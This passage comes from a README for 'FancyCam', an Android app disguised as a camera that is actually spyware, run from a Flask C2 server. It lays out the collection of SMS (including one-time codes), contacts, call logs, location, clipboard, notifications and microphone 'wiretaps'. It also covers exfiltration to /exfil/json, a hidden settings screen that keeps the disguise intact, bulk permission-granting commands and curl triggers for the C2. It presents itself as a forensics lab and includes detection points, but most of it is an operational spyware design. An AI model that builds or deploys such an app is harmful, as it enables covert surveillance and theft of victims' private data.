| `saveNotification` | `context: Context, notificationJson: JSONObject` | `Unit` | Persists notification in a 50-item circular buffer in SharedPreferences |
| `getCapturedNotifications` | `context: Context` | `JSONArray` | Returns all buffered notifications for inclusion in periodic telemetry payloads |
| `clearCapturedNotifications`| `context: Context` | `Unit` | Clears stored notification buffer |
| `exfiltrateNotification` | `context: Context, notificationJson: JSONObject` | `Unit` | Asynchronously transmits notification payload to `/exfil/json` over candidate endpoints |

---

#### 11. WorkManager Workers
- **[`DataCollectionWorker`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/workers/DataCollectionWorker.kt)**: `CoroutineWorker` executing periodic data collection (`DataExfilSender.collectAndExfiltrate()`) every 15 minutes.
- **[`PhotoUploadWorker`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/workers/PhotoUploadWorker.kt)**: `CoroutineWorker` executing background upload of captured photos with retry semantics if offline.
- **[`ScreenCaptureWorker`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/workers/ScreenCaptureWorker.kt)**: Educational placeholder worker demonstrating MediaProjection screen recording patterns.

---

## Prerequisites

### Host Machine
| Requirement | Version | Purpose |
|---|---|---|
| Python | 3.10+ | Flask C2 server |
| Flask | 2.0+ | Web framework |
| Android Studio | Electric Eel or newer | Android development & inspection |
| Android SDK | Platform SDK 34 / 35 (min API 24) | Build target |
| JDK | 17+ | Kotlin / Gradle compilation |
| ADB | Android Platform Tools | Device deployment and command forwarding |

### Android Device / Emulator
| Requirement | Specification |
|---|---|
| Architecture | x86_64 or ARM64 |
| Recommended Image | Pixel 4 / 6 with Google APIs (API 30 - 34) |
| Port Forwarding | `adb reverse tcp:5000 tcp:5000` |

---

## Setup & Deployment

### Step 1: Start the C2 Server
```bash
cd /mnt/Work/AndroidStudioProjects/fancycam
pip install flask
python3 flask_c2_server.py
```
*The server listens on `0.0.0.0:5000` and creates the `exfiltrated_data/` directory automatically.*

### Step 2: Configure Port Forwarding
To allow emulator or USB-connected devices to reach `127.0.0.1:5000` on your host:
```bash
adb reverse tcp:5000 tcp:5000
```

### Step 3: Clear Global Proxy (If Configured)
```bash
adb shell settings put global http_proxy :0
```

### Step 4: Build and Install APK
```bash
./gradlew assembleDebug
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

### Step 5: Grant Runtime Permissions (One-Shot Lab Setup)
```bash
# Grant every grantable runtime permission in one command
adb shell "for p in \
  android.permission.CAMERA \
  android.permission.RECORD_AUDIO \
  android.permission.ACCESS_FINE_LOCATION \
  android.permission.ACCESS_COARSE_LOCATION \
  android.permission.READ_SMS \
  android.permission.READ_CONTACTS \
  android.permission.READ_CALL_LOG \
  android.permission.READ_PHONE_STATE \
  android.permission.READ_MEDIA_IMAGES \
  android.permission.POST_NOTIFICATIONS; do \
  pm grant com.example.fancycam \$p; \
done"

# Notification listener is not a runtime permission and must be allowed separately
adb shell cmd notification allow_listener com.example.fancycam/.services.NotificationReaderService
```

**Note:** MediaProjection screen-capture consent is not an ADB-grantable permission; the first `take_screenshot` trigger will still show the system consent dialog.

### Step 6: Launch Application
```bash
adb shell am start -n com.example.fancycam/.ui.MainActivity
```

---

## Web Dashboard Features

Navigate to `http://localhost:5000` in your web browser:

1. **Left Sidebar Device Switcher:**
   - Displays all connected Android targets with live status dot (`green` = online, `gray` = offline).
   - Shows device model, brand, Android version, and SDK level.
   - Click any device to isolate telemetry, screenshots, and audio recordings for that target.

2. **Top Operational Action Bar:**
   - **📸 Trigger Photo Capture**: Emits `take_photo` C2 command to target device.
   - **🎙️ Record Audio (30s)**: Emits `record_audio` command to activate device microphone.
   - **Payload Selector**: Quick-load specific timestamped JSON dumps.

3. **Tabbed Forensics Workspace:**
   - **Overview**: System counters, connection timestamps, hardware breakdown.
   - **SMS**: Table of messages with sender, body, and timestamp.
   - **Contacts**: Harvested address book entries.
   - **Call Log**: Inbound, outbound, and missed call logs with durations.
   - **Location**: GPS coordinates with accuracy and OpenStreetMap link.
   - **Wi-Fi**: Connected SSID/BSSID and visible network scan results.
   - **Clipboard**: Contents captured from clipboard history.
   - **Screenshots**: Gallery of camera captures and screenshots with lightbox zoom.
   - **Audio Recordings**: In-browser HTML5 player for recorded wiretaps.
   - **Raw JSON**: Syntax-highlighted, formatted JSON tree view.

---

## Data Collection Capabilities

1. **Device Fingerprinting:**
   - Unique identifier (`Settings.Secure.ANDROID_ID`)
   - `Build.BRAND`, `Build.MODEL`, `Build.MANUFACTURER`, `Build.FINGERPRINT`
   - Complete inventory of installed application package names.

2. **SMS Retrieval:**
   - Direct query to `content://sms` content provider (`address`, `body`, `date`, `type`, `read`).

3. **Contact Harvesting:**
   - Direct query to `ContactsContract.CommonDataKinds.Phone` (`DISPLAY_NAME`, `NUMBER`, `CONTACT_ID`).

4. **Call Log Extraction:**
   - Query to `CallLog.Calls` (`NUMBER`, `CACHED_NAME`, `TYPE`, `DURATION`, `DATE`).

5. **Location Tracking:**
   - Obtains latest GPS / Network coordinates via `LocationManager` with altitude and accuracy.

6. **Clipboard Monitoring:**
   - Reads current clipboard content via `ClipboardManager.getPrimaryClip()`.

7. **Wi-Fi Network Scanning:**
   - Connected SSID, BSSID, RSSI, and surrounding visible access points via `WifiManager.getScanResults()`.

8. **Microphone Audio Eavesdropping:**
   - Hardware microphone recording using `MediaRecorder` encoded as AAC at 128 kbps (MPEG-4 container).

9. **Notification Sniffing:**
   - Captures text, titles, packages, and progress indicators from all incoming notifications via `NotificationListenerService`.

10. **Cellular Network Info:**
    - SIM operator, network carrier, roaming status, and country codes via `TelephonyManager`.

---

## Exfiltrated Data Payload Schema

Sample structure of payload delivered to `POST /exfil/json`:

```json
{
  "device_info": {
    "android_id": "9774d56d682e549c",
    "timestamp": "2026-10-16T00:15:00.123+0530",
    "brand": "google",
    "model": "sdk_gphone64_x86_64",
    "manufacturer": "Google",
    "product": "sdk_gphone64_x86_64",
    "hardware": "ranchu",
    "fingerprint": "google/sdk_gphone64_x86_64/emulator64_x86_64:14/UE1A.230829.036.A1/11223344:userdebug/dev-keys",
    "sdk_version": 34,
    "release": "14",
    "installed_apps": [
      { "package": "com.example.fancycam", "name": "FancyCam", "version": "1.0", "version_code": 1 },
      { "package": "com.google.android.apps.messaging", "name": "Messages", "version": "2024", "version_code": 100 }
    ]
  },
  "sms_messages": [
    {
      "address": "+15551234567",
      "body": "Your one-time security code is 849201",
      "date": 1729017000000,
      "type": 1,
      "read": 1
    }
  ],
  "contacts": [
    {
      "name": "Alice Smith",
      "number": "+15559876543",
      "contact_id": "1"
    }
  ],
  "call_logs": [
    {
      "number": "+15559876543",
      "name": "Alice Smith",
      "type": "INCOMING",
      "duration": "142",
      "date": 1729016500000
    }
  ],
  "location": {
    "latitude": 37.4220,
    "longitude": -122.0841,
    "accuracy": 12.5,
    "altitude": 15.0,
    "provider": "fused",
    "timestamp": 1729017000000
  },
  "clipboard": {
    "count": 1,
    "items": ["https://internal.bank.com/transfer?session=9f8e7d"]
  },
  "wifi_networks": {
    "connected": {
      "ssid": "\"Corporate-WPA3\"",
      "bssid": "00:11:22:33:44:55",
      "rssi": -55
    },
    "scan_results": [
      { "ssid": "Corporate-WPA3", "bssid": "00:11:22:33:44:55", "level": -55, "capabilities": "[WPA2-PSK-CCMP]" },
      { "ssid": "Guest-WiFi", "bssid": "00:11:22:33:44:66", "level": -72, "capabilities": "[ESS]" }
    ]
  },
  "network_info": {
    "sim_operator_name": "Android",
    "network_operator_name": "T-Mobile",
    "sim_country_iso": "us",
    "network_country_iso": "us",
    "phone_type": "GSM"
  },
  "notifications": [
    {
      "package": "com.whatsapp",
      "title": "Security Team",
      "text": "Password reset requested for administrator account",
      "sub_text": "WhatsApp",
      "timestamp": 1729017370000,
      "is_ongoing": false
    }
  ]
}
```

---

## Forensic Detection Points

| Technique | Detection Command / Artifact | What to Look For |
|---|---|---|
| **C2 Heartbeat Traffic** | Wireshark filter: `http.request.uri contains "/api/heartbeat"` | Regular 15-second POST beaconing containing Android ID |
| **Telemetry Ingestion** | Wireshark filter: `http.request.uri == "/exfil/json"` | Large POST containing JSON keys `sms_messages`, `contacts`, `location` |
| **Media Uploads** | Wireshark filter: `http.request.uri contains "/exfil/"` | Multipart POSTs with `image/jpeg` or `audio/mp4` boundaries |
| **SMS Provider Query** | `adb shell dumpsys dbinfo com.android.providers.telephony` | Read count on `sms` table by UID matching FancyCam |
| **Contact Access** | `adb shell dumpsys dbinfo com.android.providers.contacts` | Read count on `view_data` / `phone_lookup` |
| **Call Log Queries** | `adb shell dumpsys dbinfo com.android.providers.contacts` | Queries to `calls` table |
| **Location Access** | `adb shell dumpsys location` | Last request timestamps under `Geofence Manager` & `Location Providers` |
| **Microphone Usage** | `adb shell dumpsys audio` | Active recording session attribution under `MediaRecorder` |
| **Notification Listener** | `adb shell settings get secure enabled_notification_listeners` | Presence of `com.example.fancycam/.services.NotificationReaderService` |
| **WorkManager Persistence** | `adb shell "run-as com.example.fancycam ls databases/"` | `androidx.work.workdb` with periodic task `edu_data_collection` |
| **Storage Artifacts** | `adb shell ls -la /sdcard/DCIM/Camera/` | `IMG_*.jpg` files corresponding with server exfiltration times |

---

## Lab Exercises

### Exercise 1: Identify Data Collection Endpoints
- **Objective:** Map all outbound C2 endpoints using Logcat and network captures.
- **Commands:**
  ```bash
  adb logcat -s "DataExfilSender:D" "PhotoUploader:D" "MicrophoneCapture:D"
  ```
- **Goal:** Document IP, port, and URLs hit during startup and photo capture.

### Exercise 2: C2 Command Injection & Wiretap Analysis
- **Objective:** Trigger remote commands using the C2 server API and analyze device reaction.
- **Commands:**
  ```bash
  # Queue an audio wiretap
  curl -X POST http://localhost:5000/api/trigger/audio -H "Content-Type: application/json" -d '{"target":"all"}'
  ```
- **Goal:** Trace command reception in heartbeat response, verify MediaRecorder initialization in logcat, and verify `.m4a` file upload and subsequent local scrub.

### Exercise 3: WorkManager Database Extraction
- **Objective:** Extract the WorkManager database to analyze background scheduling.
- **Commands:**
  ```bash
  adb shell "run-as com.example.fancycam sqlite3 /data/data/com.example.fancycam/databases/androidx.work.workdb 'SELECT id, state, worker_class_name, interval_duration FROM workspec;'"
  ```

### Exercise 4: Forensic Timeline Reconstruction
- **Objective:** Correlate server exfiltration timestamps (`exfiltrated_data/`) with device MediaStore timestamps and system logs.

---

## Project Structure

```
fancycam/
├── app/
│   ├── build.gradle.kts                      # Module build configuration & dependencies
│   └── src/
│       ├── main/
│       │   ├── AndroidManifest.xml           # Manifest: permissions, activities, services
│       │   ├── java/com/example/fancycam/
│       │   │   ├── MainActivity.kt           # Viewfinder UI, capture flow, heartbeat loop
│       │   │   ├── SettingsActivity.kt       # Hidden settings UI, health monitor, audit log
│       │   │   ├── AppConfig.kt              # Host/port settings & candidate endpoint resolver
│       │   │   ├── CameraHelper.kt           # CameraX lifecycle binder, lens switch, flash
│       │   │   ├── DataExfilSender.kt        # Master collection engine & C2 command dispatcher
│       │   │   ├── PhotoUploader.kt          # Multipart photo uploader with failover
│       │   │   ├── PhotoStorageManager.kt    # DCIM/Camera storage & MediaStore indexing
│       │   │   ├── MicrophoneCapture.kt      # Hardware audio recorder & exfiltration
│       │   │   ├── NotificationReaderService.kt # NotificationListenerService implementation
│       │   │   ├── DataCollectionWorker.kt   # WorkManager 15-min periodic telemetry worker
│       │   │   ├── PhotoUploadWorker.kt      # WorkManager persistent photo backup worker
│       │   │   ├── ScreenCaptureWorker.kt    # WorkManager screen capture placeholder
│       │   │   └── AppActivityLogger.kt      # Internal activity audit trail manager
│       │   └── res/
│       │       ├── layout/
│       │       │   ├── activity_main.xml     # Main camera viewfinder layout
│       │       │   ├── activity_settings.xml # Internal controls & diagnostics layout
│       │       │   └── item_activity_log.xml # Activity log list item layout
│       │       └── xml/
│       │           └── network_security_config.xml # Cleartext HTTP traffic allowance
├── flask_c2_server.py                        # Python Flask C2 server & REST API
├── templates/
│   └── dashboard.html                        # Web UI operator dashboard template
├── exfiltrated_data/                         # Received data organized per device
│   └── <android_id>/
│       ├── json_data/                        # Telemetry JSON dumps
│       ├── screenshots/                      # Captured photos & screenshots
│       └── audio/                            # Audio recordings (.m4a)
└── README.md                                 # Complete documentation
```

---

## Configuration

### Changing C2 Server Location

You can configure the target server address in two ways:

1. **In-App (No Recompilation Required):**
   - Long-press the **FancyCam** header title on the main camera screen.
   - Enter your host IP (e.g., `10.0.2.2` or your local LAN IP `192.168.1.x`) and port (`5000`).
   - Tap **Save & Test**. The live health indicator updates in real-time.

2. **Source Defaults:**
   - **File:** [`AppConfig.kt`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/network/AppConfig.kt)
   ```kotlin
   const val DEFAULT_HOST = "127.0.0.1"
   const val DEFAULT_PORT = 5000
   const val EMULATOR_FALLBACK_HOST = "10.0.2.2"
   ```

---

## Hidden Internal Controls & Settings

To preserve the appearance of a clean, standard camera app:
- The top bar contains only the "FancyCam" header and the flash mode toggle button.
- There is **no visible settings button** in the UI.
- Access to the internal diagnostics and configuration screen ([`SettingsActivity`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/ui/SettingsActivity.kt)) is triggered by **long-pressing the "FancyCam" header** at the top of the screen.

### Settings Screen Features:
- **Server Configuration:** Modify Host/IP and Port on the fly.
- **Live Health Monitor:** Real-time pulse indicator showing server online/offline state and round-trip ping latency.
- **Activity Audit Log:** Chronological list of camera captures, data transmissions, configuration changes, and errors with status badges.
- **Clear Activity History:** Purges stored local audit logs.

---

## Troubleshooting

### Connection Refused (`127.0.0.1:5000`)
- **Cause:** `adb reverse` port mapping is inactive or was reset when the device/emulator restarted.
- **Remedy:** Re-run:
  ```bash
  adb reverse tcp:5000 tcp:5000
  ```
- *Note: FancyCam automatically falls back to `10.0.2.2:5000` if `127.0.0.1` is unreachable on the Android emulator.*

### Proxy Redirection Conflicts
- **Cause:** Stale emulator HTTP proxy settings diverting traffic.
- **Remedy:**
  ```bash
  adb shell settings put global http_proxy :0
  ```

### Test SMS Not Appearing in Exfiltration
- **Cause:** Android 10+ restricts inserting SMS into content providers unless the app is the default SMS handler.
- **Remedy:** Use root adb content insertion for lab data population:
  ```bash
  adb root
  adb shell content insert --uri content://sms/inbox --bind address:s:"+15551234567" --bind "body:s:Lab test security code 4910" --bind date:l:1729017000000 --bind type:i:1
  ```

### Notification Listener Disconnected
- **Cause:** Security policy requires explicit user activation.
- **Remedy:**
  ```bash
  adb shell cmd notification allow_listener com.example.fancycam/.services.NotificationReaderService
  ```

---

## Disclaimer

This project is developed and distributed **exclusively for academic education, digital forensics research, and defensive cybersecurity training**. The techniques and code patterns demonstrate vulnerabilities and malicious tradecraft documented in public security literature. **Never install or execute this application on any device without explicit, written authorization from the owner.** Misuse of these techniques outside an authorized sandbox violates state, federal, and international computer crime statutes.